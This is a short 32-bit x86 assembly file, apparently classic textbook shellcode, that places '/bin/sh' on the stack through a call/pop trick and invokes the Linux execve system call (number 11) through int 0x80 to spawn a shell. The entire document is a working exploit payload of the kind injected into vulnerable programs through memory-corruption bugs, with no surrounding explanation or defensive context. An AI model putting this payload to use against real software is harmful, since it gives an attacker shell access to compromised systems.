; shellcode.asm
BITS 32
global _start
 
_start:
    call syscall
    db '/bin/sh',0

syscall:
    pop ebx
    mov eax, 11
    xor ecx, ecx
    xor edx, edx
    int 0x80
